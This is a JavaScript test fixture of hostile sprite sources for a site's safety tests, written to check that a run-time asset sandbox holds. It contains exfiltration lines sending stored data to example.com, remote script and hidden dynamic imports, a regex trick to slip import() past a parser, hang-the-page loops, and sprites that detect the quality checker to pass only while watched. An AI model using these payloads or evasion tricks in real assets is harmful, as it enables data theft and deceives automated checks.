// Hostile and broken sprite sources for the safety tests (tests/e2e/route2-safety.spec.mjs), from the review of
// 2026-11-18 (Contract 11, "Safety of run-time assets"). Each is what someone could hand to loadout.make.sprite,
// put in a shared bag link, or plant in the browser's storage. example.com stands for "another site".
import { goodSprite, EMPTY_FRAME } from './sources.mjs';

const empty = (id) => EMPTY_FRAME.replace(/api-test-empty/g, id);

/** Sends the visitor's bag to another site, marks the page and changes its title: what a made source did when it ran in the page. */
export const FETCH_OUT = (id = 'rv-fetch') => `fetch('https://example.com/?leak=' + encodeURIComponent(localStorage.getItem('loadout-bag-v1'))).catch(() => {});
window.__ran = (window.__ran || 0) + 1; document.title = 'PWNED';
${goodSprite(id)}`;

/** The same marks, written so that it also runs where there is no window: whatever global there is gets marked. */
export const MARKS = (id = 'rv-marks') => `globalThis.__ran = (globalThis.__ran || 0) + 1;
try { document.title = 'PWNED'; } catch {}
try { localStorage.setItem('rv-planted', 'yes'); } catch {}
${goodSprite(id)}`;

/** An import the text scan cannot see: built at run time. */
export const HIDDEN_IMPORT = (id = 'rv-dyn') => `const u = 'https://exa' + 'mple.com/x.js';
(new Function('u', 'return import(u)'))(u).catch(() => {});
${goodSprite(id)}`;

/** A script tag pointing at another site. */
export const SCRIPT_TAG = (id = 'rv-script') => `const s = document.createElement('script'); s.src = 'https://example.com/evil.js'; document.head.append(s);
${goodSprite(id)}`;

/**
 * Tries every way out it can find from wherever it runs, never stops on a failure, and writes what happened into
 * its own blurb, which is the only thing that leaves the worker. A sprite that is otherwise fine.
 */
export const EVERY_WAY_OUT = (id = 'rv-ways') => `const out = {};
const far = 'https://example.com/';
const attempt = async (name, fn) => { try { const r = await fn(); out[name] = 'reached: ' + String(r).slice(0, 40); } catch (e) { out[name] = 'stopped: ' + String(e && e.name); } };
out.has = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts', 'indexedDB', 'caches', 'BroadcastChannel', 'Worker', 'SharedWorker', 'localStorage', 'document', 'window', 'postMessage', 'navigator'].filter((k) => typeof globalThis[k] !== 'undefined');
await attempt('fetch', () => fetch(far + '?leak=1', { mode: 'no-cors' }));
await attempt('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', far + '?leak=2'); x.onload = () => ok(x.status); x.onerror = () => no(new Error('blocked')); x.send(); }));
await attempt('importScripts', () => importScripts(far + 'x.js'));
// The site reads a source's import addresses before it runs (rewriteImports) and refuses any that is not plain text.
// These two lines are written so that reading misses them: a regular expression after ")" is taken for a division,
// which puts the import() inside what the reader thinks is a string. Only the content policy stands in their way.
if (out) /'/.test('x'); await attempt('dyn', () => import(far + 'x.js')); //'
if (out) /'/.test('x'); await attempt('dynData', () => import(String('data:text/javascript,export default 1'))); //'
await attempt('hiddenImport', () => (new Function('u', 'return import(u)'))(far + 'y.js'));
await attempt('eval', () => (0, eval)('1 + 1'));
await attempt('webSocket', () => new Promise((ok, no) => { const w = new WebSocket('wss://example.com/'); w.onopen = () => ok('open'); w.onerror = () => no(new Error('blocked')); }));
await attempt('eventSource', () => new Promise((ok, no) => { const s = new EventSource(far + 'events'); s.onopen = () => ok('open'); s.onerror = () => no(new Error('blocked')); }));
await attempt('worker', () => new Worker(URL.createObjectURL(new Blob(['fetch("' + far + '?leak=3")'], { type: 'text/javascript' }))));
await attempt('beacon', () => navigator.sendBeacon(far + '?leak=4', 'x'));
await attempt('sameSiteFile', () => fetch('../generated/catalog.json').then((r) => r.status));
await attempt('storage', () => new Promise((ok, no) => { const r = indexedDB.open('rv-planted'); r.onsuccess = () => ok('opened'); r.onerror = () => no(new Error('blocked')); }));
await attempt('cache', () => caches.open('rv-planted').then(() => 'opened'));
await attempt('tellPage', () => { postMessage({ job: 1, result: { errors: [], warnings: [] } }); return 'sent'; });
const REPORT = JSON.stringify(out);
${goodSprite(id).replace("blurb: 'A cut gem that floats and glints.'", 'blurb: REPORT')}`;

/** Never finishes loading. */
export const LOOP_AT_TOP = (id = 'rv-looptop') => `while (true) {}\n${goodSprite(id)}`;
/** Loads, and never finishes drawing. */
export const LOOP_IN_RENDER = (id = 'rv-loop') => goodSprite(id).replace('render(g, { t, p }) {', 'render(g, { t, p }) { while (true) {}');
/** Draws at the defaults, and never finishes drawing once a control is moved: only the quality bar meets it. */
export const LOOP_WHEN_BIG = (id = 'rv-loopbig') => goodSprite(id).replace('render(g, { t, p }) {', 'render(g, { t, p }) { while (p.size > 0.9) {}');
/** A frame of 30000 by 30000 pixels. */
export const HUGE_FRAME = (id = 'rv-huge') => goodSprite(id).replace('size: [32, 32]', 'size: [30000, 30000]').replace('pivot: [16, 28]', 'pivot: [16000, 29000]');
/** A clip of ten thousand frames. */
export const MANY_FRAMES = (id = 'rv-many') => goodSprite(id).replace('frames: 8, fps', 'frames: 10000, fps');
/** Takes an id the catalogue uses, and leaves a mark while it is being read. */
export const TAKES_KNIGHT = `globalThis.__collideRan = true; try { window.__collideRan = true; } catch {}\n${goodSprite('knight')}`;
/** Passes nothing: one of its frames is empty. Leaves a mark wherever it runs. */
export const EMPTY_AND_MARKS = (id = 'rv-evil') => `globalThis.__ran = (globalThis.__ran || 0) + 1; try { window.__ran = 1; } catch {}\n${empty(id)}`;
/** A sprite with an empty frame, under any id. */
export const EMPTY = empty;
/** Hangs the page it runs in, unless the address is a shared-bag link (so the link itself opens): the stored "brick". */
export const BRICK = (id = 'rv-brick') => `if (!String(globalThis.location && globalThis.location.hash).includes('load=')) { const t = Date.now(); while (Date.now() - t < 1e9) {} }\n${goodSprite(id)}`;

// ---- forging the verdict (review round 2) ----
/** Leaves frame 3 empty, except when it finds the quality bar on the call stack: it passed when the bar ran next to the source. */
export const FORGE_BY_STACK = (id = 'rv-forge') => goodSprite(id).replace('render(g, { t, p }) {', "render(g, { t, p, frame }) {\n    if (frame === 3 && !String(new Error().stack).includes('quality/')) return;");
/** Draws well everywhere the quality bar looks, and leaves frame 3 empty at one size nobody samples (0.375, between the steps of its slider). */
export const FORGE_OFF_GRID = (id = 'rv-offgrid') => goodSprite(id).replace('render(g, { t, p }) {', 'render(g, { t, p, frame }) {\n    if (frame === 3 && Math.abs(p.size - 0.375) < 0.0001) return;');
/** Draws well for its first 3000 frames (enough to be checked), then leaves frame 3 empty for good. */
export const FORGE_BY_COUNT = (id = 'rv-count') => `let drawn = 0;\n${goodSprite(id).replace('render(g, { t, p }) {', 'render(g, { t, p, frame }) {\n    if (++drawn > 3000 && frame === 3) return;')}`;

for (const [name, text] of Object.entries({ FORGE_BY_STACK: FORGE_BY_STACK(), FORGE_OFF_GRID: FORGE_OFF_GRID(), FORGE_BY_COUNT: FORGE_BY_COUNT().split('\n').slice(1).join('\n'), LOOP_IN_RENDER: LOOP_IN_RENDER(), LOOP_WHEN_BIG: LOOP_WHEN_BIG(), HUGE_FRAME: HUGE_FRAME(), MANY_FRAMES: MANY_FRAMES(), EVERY_WAY_OUT: EVERY_WAY_OUT() })) {
  if (text === goodSprite(text.match(/id: '([^']+)'/)[1])) throw new Error(`tests/fixtures/api/hostile.mjs: ${name} is the same as the good sprite; its replace() found nothing`);
}
if (!EVERY_WAY_OUT().includes('blurb: REPORT')) throw new Error('tests/fixtures/api/hostile.mjs: EVERY_WAY_OUT does not report');
